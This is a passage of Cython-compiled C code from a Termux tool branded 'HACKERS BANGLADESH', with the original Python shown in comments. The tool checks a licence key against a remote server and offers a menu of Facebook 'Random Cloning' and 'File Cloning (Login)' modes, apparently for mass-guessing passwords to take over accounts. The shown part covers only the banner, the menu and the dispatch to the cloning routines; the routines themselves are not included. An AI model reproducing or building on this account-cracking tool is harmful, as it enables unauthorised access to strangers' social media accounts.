 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
      __Pyx_INCREF(__pyx_kp_s_you_are_not_registered);
      __Pyx_XDECREF_SET(__pyx_v_expired, __pyx_kp_s_you_are_not_registered);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":91
 * 	def __start__(self):
 * 		os.system("clear")
 * 		try:             # <<<<<<<<<<<<<<
 * 			key = open(".__apikey__.log","r").read()
 * 			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
 */
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_5, __pyx_t_6);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":99
 * 			status = "Trial"
 * 			expired = "you are not registered"
 * 		if "Premium" in status:             # <<<<<<<<<<<<<<
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 */
  __pyx_t_10 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_Premium, __pyx_v_status, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 99, __pyx_L1_error)
  __pyx_t_11 = (__pyx_t_10 != 0);
  if (__pyx_t_11) {

    /* "libme.pyx":100
 * 			expired = "you are not registered"
 * 		if "Premium" in status:
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")             # <<<<<<<<<<<<<<
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 * 			print ("  [] Your ip : %s "%(ip))
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_1_92m_____1_92m_1_92m) < 0) __PYX_ERR(0, 100, __pyx_L1_error)

    /* "libme.pyx":101
 * 		if "Premium" in status:
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))             # <<<<<<<<<<<<<<
 * 			print ("  [] Your ip : %s "%(ip))
 * 			print ("  [] Expired : %s "%(expired))
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_date); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 101, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_7 = __Pyx_PyString_FormatSafe(__pyx_kp_s_1_92m_T_Date_s, __pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 101, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (__Pyx_PrintOne(0, __pyx_t_7) < 0) __PYX_ERR(0, 101, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "libme.pyx":102
 * 			print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 * 			print ("  [] Your ip : %s "%(ip))             # <<<<<<<<<<<<<<
 * 			print ("  [] Expired : %s "%(expired))
 * 			print ("  [] Status  : \033[1;32mPrimium\033[0;97m")
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ip); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Your_ip_s, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 102, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 102, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "libme.pyx":103
 * 			print ("\033[1;92m  [] T-Date  : %s "%(date))
 * 			print ("  [] Your ip : %s "%(ip))
 * 			print ("  [] Expired : %s "%(expired))             # <<<<<<<<<<<<<<
 * 			print ("  [] Status  : \033[1;32mPrimium\033[0;97m")
 * 			print("\n  [1] 2009 Random Cloning\033[0;97m (Mbasic)")
 */
    __pyx_t_2 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Expired_s, __pyx_v_expired); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 103, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (__Pyx_PrintOne(0, __pyx_t_2) < 0) __PYX_ERR(0, 103, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "libme.pyx":104
 * 			print ("  [] Your ip : %s "%(ip))
 * 			print ("  [] Expired : %s "%(expired))
 * 			print ("  [] Status  : \033[1;32mPrimium\033[0;97m")             # <<<<<<<<<<<<<<
 * 			print("\n  [1] 2009 Random Cloning\033[0;97m (Mbasic)")
 * 			print("  [2] 2008 to 2010  Random Cloning\033[0;97m (free)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_Status_1_32mPrimium_0_97m) < 0) __PYX_ERR(0, 104, __pyx_L1_error)

    /* "libme.pyx":105
 * 			print ("  [] Expired : %s "%(expired))
 * 			print ("  [] Status  : \033[1;32mPrimium\033[0;97m")
 * 			print("\n  [1] 2009 Random Cloning\033[0;97m (Mbasic)")             # <<<<<<<<<<<<<<
 * 			print("  [2] 2008 to 2010  Random Cloning\033[0;97m (free)")
 * 			print("  [3] 2005 Random Cloning\033[0;97m (B-api)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_1_2009_Random_Cloning_0_97m_Mba) < 0) __PYX_ERR(0, 105, __pyx_L1_error)

    /* "libme.pyx":106
 * 			print ("  [] Status  : \033[1;32mPrimium\033[0;97m")
 * 			print("\n  [1] 2009 Random Cloning\033[0;97m (Mbasic)")
 * 			print("  [2] 2008 to 2010  Random Cloning\033[0;97m (free)")             # <<<<<<<<<<<<<<
 * 			print("  [3] 2005 Random Cloning\033[0;97m (B-api)")
 * 			print("  [4] 2004 Random Cloning\033[0;97m (B-api)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_2_2008_to_2010_Random_Cloning_0) < 0) __PYX_ERR(0, 106, __pyx_L1_error)

    /* "libme.pyx":107
 * 			print("\n  [1] 2009 Random Cloning\033[0;97m (Mbasic)")
 * 			print("  [2] 2008 to 2010  Random Cloning\033[0;97m (free)")
 * 			print("  [3] 2005 Random Cloning\033[0;97m (B-api)")             # <<<<<<<<<<<<<<
 * 			print("  [4] 2004 Random Cloning\033[0;97m (B-api)")
 * 			print("  [5] File Cloning\033[0;37m (Login)")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_3_2005_Random_Cloning_0_97m_B_a) < 0) __PYX_ERR(0, 107, __pyx_L1_error)

    /* "libme.pyx":108
 * 			print("  [2] 2008 to 2010  Random Cloning\033[0;97m (free)")
 * 			print("  [3] 2005 Random Cloning\033[0;97m (B-api)")
 * 			print("  [4] 2004 Random Cloning\033[0;97m (B-api)")             # <<<<<<<<<<<<<<
 * 			print("  [5] File Cloning\033[0;37m (Login)")
 * 			choose = input("\n  [] Select One : ")
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_4_2004_Random_Cloning_0_97m_B_a) < 0) __PYX_ERR(0, 108, __pyx_L1_error)

    /* "libme.pyx":109
 * 			print("  [3] 2005 Random Cloning\033[0;97m (B-api)")
 * 			print("  [4] 2004 Random Cloning\033[0;97m (B-api)")
 * 			print("  [5] File Cloning\033[0;37m (Login)")             # <<<<<<<<<<<<<<
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:
 */
    if (__Pyx_PrintOne(0, __pyx_kp_s_5_File_Cloning_0_37m_Login) < 0) __PYX_ERR(0, 109, __pyx_L1_error)

    /* "libme.pyx":110
 * 			print("  [4] 2004 Random Cloning\033[0;97m (B-api)")
 * 			print("  [5] File Cloning\033[0;37m (Login)")
 * 			choose = input("\n  [] Select One : ")             # <<<<<<<<<<<<<<
 * 			if choose in [""]:
 * 				print(" [!!] Sorry Your Choice Wrong")
 */
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 110, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_v_choose = __pyx_t_2;
    __pyx_t_2 = 0;

    /* "libme.pyx":111
 * 			print("  [5] File Cloning\033[0;37m (Login)")
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:             # <<<<<<<<<<<<<<
 * 				print(" [!!] Sorry Your Choice Wrong")
 * 				self.__start__()
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_10 = (__pyx_t_11 != 0);
    if (__pyx_t_10) {

      /* "libme.pyx":112
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:
 * 				print(" [!!] Sorry Your Choice Wrong")             # <<<<<<<<<<<<<<
 * 				self.__start__()
 * 			elif choose in ["1", "01"]:
 */
      if (__Pyx_PrintOne(0, __pyx_kp_s_Sorry_Your_Choice_Wrong) < 0) __PYX_ERR(0, 112, __pyx_L1_error)

      /* "libme.pyx":113
 * 			if choose in [""]:
 * 				print(" [!!] Sorry Your Choice Wrong")
 * 				self.__start__()             # <<<<<<<<<<<<<<
 * 			elif choose in ["1", "01"]:
 * 				self.__fb__()
 */
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_start); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 113, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 113, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":111
 * 			print("  [5] File Cloning\033[0;37m (Login)")
 * 			choose = input("\n  [] Select One : ")
 * 			if choose in [""]:             # <<<<<<<<<<<<<<
 * 				print(" [!!] Sorry Your Choice Wrong")
 * 				self.__start__()
 */
      goto __pyx_L12;
    }

    /* "libme.pyx":114
 * 				print(" [!!] Sorry Your Choice Wrong")
 * 				self.__start__()
 * 			elif choose in ["1", "01"]:             # <<<<<<<<<<<<<<
 * 				self.__fb__()
 * 			elif choose in ["2", "02"]:
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 114, __pyx_L1_error)
    if (!__pyx_t_11) {
    } else {
      __pyx_t_10 = __pyx_t_11;
      goto __pyx_L13_bool_binop_done;
    }
    __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 114, __pyx_L1_error)
    __pyx_t_10 = __pyx_t_11;
    __pyx_L13_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_11 = (__pyx_t_10 != 0);
    if (__pyx_t_11) {

      /* "libme.pyx":115
 * 				self.__start__()
 * 			elif choose in ["1", "01"]:
 * 				self.__fb__()             # <<<<<<<<<<<<<<
 * 			elif choose in ["2", "02"]:
 * 				self.__fb3__()
 */
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_fb); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 115, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 115, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":114
 * 				print(" [!!] Sorry Your Choice Wrong")
 * 				self.__start__()
 * 			elif choose in ["1", "01"]:             # <<<<<<<<<<<<<<
 * 				self.__fb__()
 * 			elif choose in ["2", "02"]:
 */
      goto __pyx_L12;
    }

    /* "libme.pyx":116
 * 			elif choose in ["1", "01"]:
 * 				self.__fb__()
 * 			elif choose in ["2", "02"]:             # <<<<<<<<<<<<<<
 * 				self.__fb3__()
 * 			elif choose in ["3", "03"]:
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 116, __pyx_L1_error)
    if (!__pyx_t_10) {
    } else {
      __pyx_t_11 = __pyx_t_10;
      goto __pyx_L15_bool_binop_done;
    }
    __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 116, __pyx_L1_error)
    __pyx_t_11 = __pyx_t_10;
    __pyx_L15_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_10 = (__pyx_t_11 != 0);
    if (__pyx_t_10) {

      /* "libme.pyx":117
 * 				self.__fb__()
 * 			elif choose in ["2", "02"]:
 * 				self.__fb3__()             # <<<<<<<<<<<<<<
 * 			elif choose in ["3", "03"]:
 * 				self.__fb2__()
 */
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_fb3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 117, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 117, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":116
 * 			elif choose in ["1", "01"]:
 * 				self.__fb__()
 * 			elif choose in ["2", "02"]:             # <<<<<<<<<<<<<<
 * 				self.__fb3__()
 * 			elif choose in ["3", "03"]:
 */
      goto __pyx_L12;
    }

    /* "libme.pyx":118
 * 			elif choose in ["2", "02"]:
 * 				self.__fb3__()
 * 			elif choose in ["3", "03"]:             # <<<<<<<<<<<<<<
 * 				self.__fb2__()
 * 			elif choose in ["4", "04"]:
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 118, __pyx_L1_error)
    if (!__pyx_t_11) {
    } else {
      __pyx_t_10 = __pyx_t_11;
      goto __pyx_L17_bool_binop_done;
    }
    __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 118, __pyx_L1_error)
    __pyx_t_10 = __pyx_t_11;
    __pyx_L17_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_11 = (__pyx_t_10 != 0);
    if (__pyx_t_11) {

      /* "libme.pyx":119
 * 				self.__fb3__()
 * 			elif choose in ["3", "03"]:
 * 				self.__fb2__()             # <<<<<<<<<<<<<<
 * 			elif choose in ["4", "04"]:
 * 				self.__fb4__()
 */
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_fb2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 119, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 119, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":118
 * 			elif choose in ["2", "02"]:
 * 				self.__fb3__()
 * 			elif choose in ["3", "03"]:             # <<<<<<<<<<<<<<
 * 				self.__fb2__()
 * 			elif choose in ["4", "04"]:
 */
      goto __pyx_L12;
    }

    /* "libme.pyx":120
 * 			elif choose in ["3", "03"]:
 * 				self.__fb2__()
 * 			elif choose in ["4", "04"]:             # <<<<<<<<<<<<<<
 * 				self.__fb4__()
 * 			elif choose in ["5", "05"]:
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_4, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 120, __pyx_L1_error)
    if (!__pyx_t_10) {
    } else {
      __pyx_t_11 = __pyx_t_10;
      goto __pyx_L19_bool_binop_done;
    }
    __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_04, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 120, __pyx_L1_error)
    __pyx_t_11 = __pyx_t_10;
    __pyx_L19_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_10 = (__pyx_t_11 != 0);
    if (__pyx_t_10) {

      /* "libme.pyx":121
 * 				self.__fb2__()
 * 			elif choose in ["4", "04"]:
 * 				self.__fb4__()             # <<<<<<<<<<<<<<
 * 			elif choose in ["5", "05"]:
 * 				self.__login__()
 */
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_fb4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 121, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 121, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":120
 * 			elif choose in ["3", "03"]:
 * 				self.__fb2__()
 * 			elif choose in ["4", "04"]:             # <<<<<<<<<<<<<<
 * 				self.__fb4__()
 * 			elif choose in ["5", "05"]:
 */
      goto __pyx_L12;
    }

    /* "libme.pyx":122
 * 			elif choose in ["4", "04"]:
 * 				self.__fb4__()
 * 			elif choose in ["5", "05"]:             # <<<<<<<<<<<<<<
 * 				self.__login__()
 * 			else:
 */
    __Pyx_INCREF(__pyx_v_choose);
    __pyx_t_2 = __pyx_v_choose;
    __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_5, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 122, __pyx_L1_error)
    if (!__pyx_t_11) {
    } else {
      __pyx_t_10 = __pyx_t_11;
      goto __pyx_L21_bool_binop_done;
    }
    __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_2, __pyx_kp_s_05, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 122, __pyx_L1_error)
    __pyx_t_10 = __pyx_t_11;
    __pyx_L21_bool_binop_done:;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_11 = (__pyx_t_10 != 0);
    if (__pyx_t_11) {

      /* "libme.pyx":123
 * 				self.__fb4__()
 * 			elif choose in ["5", "05"]:
 * 				self.__login__()             # <<<<<<<<<<<<<<
 * 			else:
 * 				James().__start__()
 */
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 123, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 123, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "libme.pyx":122
 * 			elif choose in ["4", "04"]:
 * 				self.__fb4__()
 * 			elif choose in ["5", "05"]:             # <<<<<<<<<<<<<<
 * 				self.__login__()
